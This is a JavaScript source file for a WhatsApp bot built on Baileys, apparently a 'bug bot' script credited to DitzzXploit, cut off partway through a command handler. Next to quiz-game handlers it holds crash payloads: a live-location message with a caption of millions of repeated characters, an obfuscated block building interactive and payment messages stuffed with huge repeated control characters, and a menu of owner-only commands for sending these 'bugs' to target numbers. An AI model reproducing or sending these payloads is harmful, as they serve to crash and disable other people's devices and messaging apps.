/*
Sc Ori By Ditzzxploit
Recode : -
subscribe yt : @DitzzXploit

Thx to support me on YouTube!
*/
require('./settings')
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, PhoneNumber, process, moment, ms, speed, syntaxerror, util, openai } = modul
const { exec, spawn, execSync } = child_process
const { Configuration, OpenAIApi } = openai
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const user = JSON.parse(fs.readFileSync('./database/user.json'))

let tebaklagu = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []

const testimoni = JSON.parse(fs.readFileSync('./database/testimoni.json'))

module.exports = kontolditzz = async (kontolditzz, m, msg, chatUpdate, store) => {
try {
const { type, quotedMsg, mentioned, now, fromMe } = m
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
const messagesC = pes.slice(0).trim()
const content = JSON.stringify(m.message)
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await kontolditzz.decodeJid(kontolditzz.user.id)
const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const XeonTheDeveloper = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')
const isSticker = (type == 'stickerMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isGroup = from.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = sender.split('@')[0]
const groupMetadata = m.isGroup ? await kontolditzz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isUser = user.includes(sender)
const banUser = await kontolditzz.fetchBlocklist()
const isBanned = banUser ? banUser.includes(m.sender) : false
const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const isEval = body.startsWith('=>')
const userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
   
const cewegw = fs.readFileSync('./database/image/cewegw.jpg')
const Kyuuu = fs.readFileSync('./database/image/Kyuu.jpg')
const kosongjpg = fs.readFileSync('./database/image/kosong.jpg')
   
//TIME
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var xeonytimewisher = `Selamat Malam ${pushname} 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Selamat Malam ${pushname} 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Selamat Malam ${pushname} 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Selamat Siang ${pushname} 🌅`
 }
 if(time2 < "10:00:00"){
var xeonytimewisher = `Selamat Pagi ${pushname} 🌄`
 }
 if(time2 < "04:00:00"){
var xeonytimewisher = `Selamat Subuh ${pushname} 🌄`
 } 
async function loading () {
var kontolditzzofc = [
"⌛10%",
"⏳30%",
"⌛50%",
"⏳80%",
"⌛100%",
"Loading Selesai..."
]
let { key } = await kontolditzz.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < kontolditzzofc; i++) {
/*await delay(10)*/
await kontolditzz.sendMessage(from, {text: kontolditzzofc[i], edit: key });//PESAN LEPAS
}
}
let d = new Date(new Date + 3600000)
let locale = 'id'
let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const isContacts = contacts.includes(sender)

if (!kontolditzz.public) {
if (!m.key.fromMe) return
}
    
    //Fake
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=${ownernomer}:${ownernomer}\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": thumb,"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

const reply = (teks) => {
kontolditzz.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : fdoc })
}
if (isCmd && isBanned) {
return
}

let list = []
for (let i of owner) {
list.push({
displayName: await kontolditzz.getName(i),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await kontolditzz.getName(i)}\nFN:${await kontolditzz.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
})
}   
//=================================================//

// Fake Bug nya //
    const fakeditzzaz = ''.repeat(99999999);
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `${fakeditzzaz}✳️᜴࿆͆᷍P Bang..........................╮⭑ ☠️⃰͜͡؜dxkV1⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(9999999),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await kontolditzz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
//Batas Fake Bug Participant //
//GAME
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakgambar[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete kuismath[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakasahotak[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksusunkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakbendera[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakbendera2[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkabupaten[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkimia[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktekateki[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaktekateki[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaktekateki[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaklagu[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakkalimat[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaklirik[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaktebakan[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await kontolditzz.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
//chat counter (console log)
if (isCmd && m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); 
}

if (isCmd && !m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); 
}

if (isCmd && !isUser) {
user.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(user, null, 2))
}

kontolditzz.sendPresenceUpdate('unavailable', from)


async function sendkontolditzzMessage(chatId, message, options = {}){
let generate = await generateWAMessage(chatId, message, options)
let type2 = getContentType(generate.message)
if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
return await kontolditzz.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

for (let Testimonii of testimoni){
if (budy === Testimonii){
let imagebuffy = fs.readFileSync(`./database/image/${Testimonii}.jpg`)
kontolditzz.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}

/*try {
ppuser = await kontolditzz.profilePictureUrl(sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}*/

    const zets = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid :"status@broadcast" }: {})},
 message:{"orderMessage":{"orderId":"174238614569438",
 "thumbnail":kosongjpg, //image 0kb
 "itemCount":999999999,
 "status":"INQUIRY","surface":"CATALOG","message":`Created By Kyuu444`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
 
 // Fake Quoted Bug //
 
function _0x59b3(_0x10f367,_0x393a26){const _0x5c759a=_0x5c75();return _0x59b3=function(_0x59b33f,_0x2d08ef){_0x59b33f=_0x59b33f-0x1bb;let _0x13d04c=_0x5c759a[_0x59b33f];return _0x13d04c;},_0x59b3(_0x10f367,_0x393a26);}const _0x45ae43=_0x59b3;(function(_0x3c5bbc,_0x59e008){const _0x454dd0=_0x59b3,_0x45fb84=_0x3c5bbc();while(!![]){try{const _0x22cd7f=parseInt(_0x454dd0(0x1ca))/0x1+parseInt(_0x454dd0(0x1c1))/0x2+-parseInt(_0x454dd0(0x1be))/0x3*(-parseInt(_0x454dd0(0x1bb))/0x4)+-parseInt(_0x454dd0(0x1bc))/0x5*(parseInt(_0x454dd0(0x1c0))/0x6)+-parseInt(_0x454dd0(0x1cc))/0x7+parseInt(_0x454dd0(0x1c2))/0x8+-parseInt(_0x454dd0(0x1c9))/0x9*(-parseInt(_0x454dd0(0x1cb))/0xa);if(_0x22cd7f===_0x59e008)break;else _0x45fb84['push'](_0x45fb84['shift']());}catch(_0x45d486){_0x45fb84['push'](_0x45fb84['shift']());}}}(_0x5c75,0xaf895));function _0x5c75(){const _0x1a2487=['868hpoFfa','1380545cVqWIq','By\x20-\x20Ən\x20çox\x20WhatsApp\x20səhvləri⭐️᜴▴Döyüşmək\x20asan\x20deyil✅⃟╮','1491JUwMZi','status@broadcast','30ESOkiq','1412062NpKJDz','1093832GGXsLm','readFileSync','0@s.whatsapp.net','review_and_pay','repeat','Ən\x20çox\x20WhatsApp\x20səhvləri⭐️᜴▴Döyüşmək\x20asan\x20deyil✅⃟╮','{\x22currency\x22:\x22IDR\x22,\x22total_amount\x22:{\x22value\x22:49981399788,\x22offset\x22:100},\x22reference_id\x22:\x224OON4PX3FFJ\x22,\x22type\x22:\x22physical-goods\x22,\x22order\x22:{\x22status\x22:\x22payment_requested\x22,\x22subtotal\x22:{\x22value\x22:49069994400,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:490699944,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:485792999999,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:48999999900,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x227842674605763435\x22,\x22product_id\x22:\x227842674605763435\x22,\x22name\x22:\x22✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴\x20#\x20𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\x22,\x22amount\x22:{\x22value\x22:9999900,\x22offset\x22:100},\x22quantity\x22:7},{\x22retailer_id\x22:\x22custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\x22,\x22name\x22:\x22\x22,\x22amount\x22:{\x22value\x22:999999900,\x22offset\x22:100},\x22quantity\x22:49}]},\x22native_payment_methods\x22:[]}','18924246uyNcLI','64422PDsSMX','10uDroCt','7127281eRarzw'];_0x5c75=function(){return _0x1a2487;};return _0x5c75();}const force={'key':{'remoteJid':_0x45ae43(0x1bf),'participant':_0x45ae43(0x1c4),'fromMe':![]},'message':{'interactiveMessage':{'header':{'title':_0x45ae43(0x1c7)},'body':{'text':'⟠\x20DitzzXploit\x20々'},'footer':{'text':_0x45ae43(0x1bd)},'nativeFlowMessage':{'messageParamsJson':'\x03'[_0x45ae43(0x1c6)](0xdbba0)}}}},force2={'key':{'participant':_0x45ae43(0x1c4),...m['chat']?{'remoteJid':_0x45ae43(0x1bf)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs[_0x45ae43(0x1c3)]('./database/image/cewegw.jpg')},'nativeFlowMessage':{'buttons':[{'name':_0x45ae43(0x1c5),'buttonParamsJson':_0x45ae43(0x1c8)}]}}}};

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

switch (command) {
case 'menu':{
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let timestampe = speed()
let latensie = speed() - timestampe
//const version = require("baileys/package.json").version
const gacor = `${xeonytimewisher}

𝗜𝗡𝗙𝗢 𝗕𝗢𝗧
*_Mode_* : ${kontolditzz.public ? 'Public' : `Self`},
*_Name Bot_*: ${global.botname}
*_Speed_*: ${latensie.toFixed(4)} miliseconds
*_Runtime_* : ${runtime(process.uptime())}

*_BugMenu_*
> <!> anti Nomor <!>
${prefix}bugtest
${prefix}ditzzbug
${prefix}dxbug-forclose
${prefix}crashcuy
${prefix}ganas-ditzz
${prefix}aipong-crash
${prefix}aipong-ampas
${prefix}anjayalok
${prefix}buggacor
${prefix}bugantiampas
`
        let hiks = {
image: Kyuuu, 
  caption: gacor,
  contextInfo:{externalAdReply:{
  title: 'DitzzXploit お',
  body: 'Subscribe YouTube', 
  showAdAttribution: true,
  thumbnail: cewegw,
  mediaType: 4,
  MediaUrl:'https://www.youtube.com/-',
  sourceUrl:"https://www.youtube.com/-",
  }}
  }
kontolditzz.sendMessage(from, hiks, {quoted: zets })}
// add bug sendiri kalo mau send ke nomor//
        break
        case "anjayalok":
        case "buggacor":
        case "bugantiampas":{
                if (!isOwner) return reply(`Khusu DitzzXploit`)
                reply(`Bntr bang Otw kirim.........`)
